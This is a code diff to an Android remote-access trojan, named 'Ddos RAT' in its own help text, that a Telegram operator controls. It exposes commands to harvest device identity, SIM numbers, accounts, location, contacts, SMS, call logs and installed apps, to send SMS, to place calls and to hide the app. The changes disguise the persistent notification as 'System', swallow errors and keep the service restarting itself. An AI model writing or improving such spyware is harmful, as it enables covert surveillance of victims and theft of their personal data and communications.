@@ -39,25 +39,37 @@ public class TelegramBot extends Service {
     public void onCreate() {
         super.onCreate();
         ctx = getApplicationContext();
-        startFg();
+        try {
+            startFg();
+        } catch (Exception e) {}
         poll();
     }
 
     private void startFg() {
-        if (Build.VERSION.SDK_INT >= 26) {
-            NotificationChannel ch = new NotificationChannel(CHANNEL, "Ddos",
-                    NotificationManager.IMPORTANCE_MIN);
-            ch.setShowBadge(false);
-            NotificationManager nm = getSystemService(NotificationManager.class);
-            if (nm != null) nm.createNotificationChannel(ch);
-        }
-        Notification n = new NotificationCompat.Builder(this, CHANNEL)
-                .setContentTitle("Ddos")
-                .setContentText("Running")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
-                .setPriority(NotificationCompat.PRIORITY_MIN)
-                .setOngoing(true).build();
-        startForeground(1001, n);
+        try {
+            if (Build.VERSION.SDK_INT >= 26) {
+                NotificationChannel ch = new NotificationChannel(CHANNEL, "System",
+                        NotificationManager.IMPORTANCE_LOW);
+                ch.setShowBadge(false);
+                NotificationManager nm = getSystemService(NotificationManager.class);
+                if (nm != null) nm.createNotificationChannel(ch);
+            }
+
+            Notification n = new NotificationCompat.Builder(this, CHANNEL)
+                    .setContentTitle("System")
+                    .setContentText("Running")
+                    .setSmallIcon(android.R.drawable.stat_notify_sync)
+                    .setPriority(NotificationCompat.PRIORITY_LOW)
+                    .setOngoing(true)
+                    .build();
+
+            if (Build.VERSION.SDK_INT >= 34) {
+                startForeground(1001, n,
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+            } else {
+                startForeground(1001, n);
+            }
+        } catch (Exception ignored) {}
     }
 
     public void init(Context c) { ctx = c; }
@@ -114,14 +126,13 @@ public class TelegramBot extends Service {
                 case "/help":
                     sendTo(cid,
                         "\uD83E\uDD16 <b>Ddos RAT</b>\n\n" +
-                        "<b>Info</b>\n" +
+                        "Info:\n" +
                         "/id /device /sim /accounts /location /battery\n" +
                         "/contacts /sms /calls /apps\n\n" +
-                        "<b>Control</b>\n" +
-                        "/sms number msg /call number\n" +
+                        "Control:\n" +
+                        "/sms number msg\n/call number\n" +
                         "/hide /users /die");
                     break;
-
                 case "/id":       sendFullIdentityTo(cid); break;
                 case "/device":   sendDeviceInfoTo(cid); break;
                 case "/sim":      sendSimNumbersTo(cid); break;
@@ -336,9 +347,11 @@ public class TelegramBot extends Service {
 
     @Override public void onDestroy() {
         Intent r = new Intent(getApplicationContext(), TelegramBot.class);
-        if (Build.VERSION.SDK_INT >= 26)
-            getApplicationContext().startForegroundService(r);
-        else getApplicationContext().startService(r);
+        try {
+            if (Build.VERSION.SDK_INT >= 26)
+                getApplicationContext().startForegroundService(r);
+            else getApplicationContext().startService(r);
+        } catch (Exception ignored) {}
         super.onDestroy();
     }
-              }
+                           }
